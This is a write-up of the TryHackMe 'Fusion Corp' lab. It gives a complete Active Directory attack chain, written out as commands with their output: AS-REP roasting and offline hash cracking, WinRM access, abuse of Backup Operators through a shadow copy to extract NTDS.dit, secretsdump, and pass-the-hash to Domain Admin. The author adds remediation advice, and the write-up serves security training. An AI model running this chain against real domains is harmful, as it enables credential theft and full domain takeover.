---
title: "TryHackMe: Fusion Corp"
date: 2026-08-02 21:30:00 +0200
categories: [TryHackMe]
tags:
  - windows
  - active-directory
  - iis
  - kerberos
  - as-rep-roasting
  - ldap
  - winrm
  - backup-operators
  - ntds
  - pass-the-hash
description: >-
  Fusion Corp began with an exposed IIS backup directory and progressed
  through AS-REP roasting, an LDAP credential disclosure, Backup Operators
  privilege abuse, NTDS.dit extraction, and Domain Administrator compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_fusion_corp
image:
  path: room_image.webp
  alt: "Original TryHackMe Fusion Corp room artwork"
toc: true
comments: false
---

**Fusion Corp** was an Active Directory challenge that began with an unauthenticated IIS directory listing. A publicly accessible employee spreadsheet disclosed candidate usernames, allowing targeted Kerberos testing. The `lparker` account was vulnerable to **AS-REP roasting**, and its password was recovered offline. Authenticated LDAP enumeration then exposed a second account password in a readable directory attribute. That account belonged to **Backup Operators**, which allowed the Active Directory database and SYSTEM registry hive to be copied from a volume shadow copy. Offline secrets extraction ultimately produced the Administrator credential material required for a **pass-the-hash** login and complete domain compromise.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Fusion Corp room card](room_card.webp){: w="303" h="272" .shadow }](https://tryhackme.com/room/fusioncorp){: .center }

## Initial Enumeration

The assessment started from an unauthenticated network position against the supplied Windows domain controller. A full TCP scan was followed by service detection on the discovered ports.

```console
$ nmap -Pn -p- --min-rate 2000 -T4 TARGET_IP
$ nmap -Pn -sC -sV -O -p <OPEN_PORTS> TARGET_IP
```

The host exposed the expected services for an Active Directory domain controller, including DNS, Kerberos, LDAP/LDAPS, SMB, RDP, WinRM, Active Directory Web Services, RPC, and Microsoft IIS.

Several baseline controls were already present: SMB signing was required, anonymous LDAP subtree queries were restricted, anonymous RPC/RID enumeration was denied, and DNS zone transfer was refused. These controls reduced basic information leakage but did not prevent the multi-stage attack path.

## Validated Attack Path

1. **Public backup exposure** — The publicly accessible `/backup/employees.ods` file disclosed employee usernames.
2. **AS-REP roasting** — The `lparker` account did not require Kerberos pre-authentication.
3. **Offline password recovery** — The returned AS-REP material was cracked using a common password wordlist.
4. **WinRM foothold** — The recovered credential allowed remote command execution as `lparker`.
5. **LDAP credential disclosure** — The password for `jmurphy` was stored in the account description attribute.
6. **Backup Operators abuse** — `SeBackupPrivilege` enabled extraction of `NTDS.dit` and the `SYSTEM` registry hive.
7. **Pass-the-hash** — Recovered Administrator NTLM material was accepted over WinRM.
8. **Domain compromise** — Domain Administrator access and all authorized objectives were validated.

> **Result:** Complete compromise of the `fusion.corp` Active Directory domain from unauthenticated network access.
{: .prompt-danger }
_Validated attack chain from public web exposure to Domain Administrator access._

### Web Enumeration

Content discovery against IIS identified a publicly accessible backup directory.

```console
$ ffuf -u http://TARGET_IP/FUZZ/ \
  -w raft-medium-directories.txt \
  -mc 200,204,301,302,307,401,403 -ac

backup                  [Status: 301]
```

Requesting the directory returned an index containing an office document:

```console
$ curl -i http://TARGET_IP/backup/

HTTP/1.1 200 OK
...
/backup/employees.ods
```

The file was downloaded for review.

```console
$ wget http://TARGET_IP/backup/employees.ods
```

The spreadsheet mapped employee names to usernames. Of particular interest was the account `lparker`, which became the entry point for the domain compromise.

## Initial Access

### AS-REP Roasting

The discovered usernames were tested for accounts that did not require Kerberos pre-authentication. The domain controller returned AS-REP material for `lparker` without requiring valid credentials.

```console
$ impacket-GetNPUsers fusion.corp/ \
  -dc-ip TARGET_IP \
  -usersfile users.txt \
  -no-pass -request \
  -format hashcat \
  -outputfile asrep.hash

$krb5asrep$23$lparker@FUSION.CORP:[REDACTED]
```

The returned material was cracked offline with Hashcat mode `18200` and a common password wordlist.

```console
$ hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

Status...........: Cracked
Recovered........: [REDACTED]
```

This worked because Kerberos pre-authentication was disabled for the account and the password did not resist common-password guessing.

### WinRM Access as lparker

The recovered credential was validated against remote services. WinRM provided an interactive foothold on the domain controller.

```console
$ evil-winrm -i TARGET_IP -u lparker -p '[REDACTED]'

*Evil-WinRM* PS C:\Users\lparker\Documents> whoami
fusion\lparker
```

The first authorized objective was available in the user's profile.

```powershell
Get-Content C:\Users\lparker\Desktop\flag.txt
THM{[REDACTED]}
```

## Privilege Escalation

### Authenticated LDAP Enumeration

The foothold allowed authenticated LDAP queries against user objects, group memberships, account controls, and descriptive attributes.

```console
$ ldapsearch -LLL -x -H ldap://TARGET_IP \
  -D 'lparker@fusion.corp' \
  -w '[REDACTED]' \
  -b 'DC=fusion,DC=corp' \
  '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName description memberOf userAccountControl
```

The `jmurphy` account contained a cleartext password in its Active Directory `description` attribute. The same LDAP object showed membership in both `Remote Management Users` and `Backup Operators`.

```text
sAMAccountName: jmurphy
description: Password set to [REDACTED]
memberOf: CN=Remote Management Users,CN=Builtin,DC=fusion,DC=corp
memberOf: CN=Backup Operators,CN=Builtin,DC=fusion,DC=corp
```

This converted a directory information disclosure into a privileged account takeover.

### WinRM Access as jmurphy

The disclosed password authenticated successfully through WinRM.

```console
$ evil-winrm -i TARGET_IP -u jmurphy -p '[REDACTED]'

*Evil-WinRM* PS C:\Users\jmurphy\Documents> whoami
fusion\jmurphy
```

The second authorized objective was present in the user's profile.

```powershell
Get-Content C:\Users\jmurphy\Desktop\flag.txt
THM{[REDACTED]}
```

### Backup Operators Privileges

The remote session had backup and restore privileges enabled.

```powershell
whoami /priv
```

```text
Privilege Name                State
============================= =======
SeBackupPrivilege             Enabled
SeRestorePrivilege            Enabled
SeShutdownPrivilege           Enabled
```

`SeBackupPrivilege` allows files to be read using backup semantics even when normal file permissions would deny access. On a domain controller, this can expose the Active Directory database when combined with a shadow copy.

### Volume Shadow Copy

A DiskShadow script was prepared using CRLF line endings.

```text
set context persistent
set metadata C:\Temp\fusion-shadow.cab
add volume C: alias cdrive
create
expose %cdrive% Z:
```

The script created a persistent shadow copy and exposed it as `Z:`.

```powershell
diskshadow.exe /s C:\Temp\shadow.txt
```

```text
Shadow copy device: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[REDACTED]
The shadow copy was successfully exposed as Z:\.
```

### NTDS.dit and SYSTEM Extraction

The Active Directory database was copied from the shadow volume using backup mode. The SYSTEM registry hive was also saved because it contains the boot key material required to decrypt secrets from `NTDS.dit`.

```powershell
robocopy /B Z:\Windows\NTDS C:\Temp ntds.dit
reg.exe save HKLM\SYSTEM C:\Temp\SYSTEM.hive /y
```

The files were transferred to the assessment system for offline analysis.

## Domain Compromise

### Offline Secrets Extraction

Impacket `secretsdump` was used locally with the copied database and registry hive.

```console
$ impacket-secretsdump \
  -ntds ntds.dit \
  -system SYSTEM.hive \
  LOCAL

Administrator:500:[REDACTED]:[REDACTED]:::
krbtgt:502:[REDACTED]:[REDACTED]:::
```

This exposed the credential material for domain users and privileged identities, including Administrator and `krbtgt`. In a production environment, loss of `NTDS.dit` must be treated as compromise of the domain security boundary rather than as a single-account incident.

### Pass-the-Hash

The recovered Administrator NTLM material was accepted by WinRM without knowledge of the plaintext password.

```console
$ netexec winrm TARGET_IP \
  -d fusion.corp \
  -u Administrator \
  -H '[REDACTED]'

WINRM  TARGET_IP  5985  FUSION-DC
[+] fusion.corp\Administrator:[REDACTED] (Pwn3d!)
```

An Administrator shell was then established.

```console
$ evil-winrm -i TARGET_IP \
  -u Administrator \
  -H '[REDACTED]'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fusion\administrator
```

The final authorized objective confirmed complete domain compromise.

```powershell
Get-Content C:\Users\Administrator\Desktop\flag.txt
THM{[REDACTED]}
```

## Security Impact

The final result was not limited to local administrative access. The attack exposed the Active Directory credential database and allowed authentication as the domain Administrator. An equivalent production compromise could enable:

- impersonation of domain users, computers, administrators, and service accounts;
- unauthorized access to file shares, applications, backups, and connected Windows systems;
- modification of Group Policy, authentication policy, logging, and security controls;
- long-term persistence through privileged identities or stolen Kerberos keys;
- ransomware deployment, service disruption, and data exfiltration;
- a broad identity recovery effort involving privileged credential rotation and two staged `krbtgt` password resets.

## Remediation

The validated chain depended on multiple weaknesses that should be remediated together:

1. Remove backup artifacts from the IIS web root and disable directory browsing.
2. Require Kerberos pre-authentication for all users and reset weak or exposed passwords.
3. Remove passwords and other secrets from Active Directory attributes.
4. Remove routine users from `Backup Operators` and prevent backup identities from using WinRM or RDP interactively.
5. Restrict remote administration to hardened management networks and privileged access workstations.
6. Monitor AS-REP roasting patterns, unusual backup-operator logons, shadow-copy creation, registry hive saves, and access to `NTDS.dit`.
7. Treat any real-world extraction of `NTDS.dit` as a full domain compromise and execute an Active Directory compromise-recovery process.

## Cleanup

Temporary files and the persistent shadow copy were removed after validation.

```powershell
Remove-Item C:\Temp\ntds.dit -Force
Remove-Item C:\Temp\SYSTEM.hive -Force
Remove-Item C:\Temp\shadow.txt -Force
Remove-Item C:\Temp\fusion-shadow.cab -Force
mountvol Z: /D
```

The shadow copy was deleted and the exposed drive was verified as absent.

```powershell
Get-CimInstance Win32_ShadowCopy
Test-Path Z:\
```

```text
False
```

No persistence mechanism, new account, scheduled task, service, or policy change was introduced during the assessment.

## Lessons Learned

Fusion Corp demonstrated how ordinary configuration and data-handling failures can combine into a complete Active Directory compromise. Strong controls on SMB, LDAP, RPC, and DNS did not compensate for a public backup file, an AS-REP-roastable account, a password stored in directory metadata, and excessive backup privileges. The most important defensive lesson is to evaluate the complete attack path rather than treating each weakness in isolation.

<style>
  .center img {
    display: block;
    margin-left: auto;
    margin-right: auto;
  }
</style>
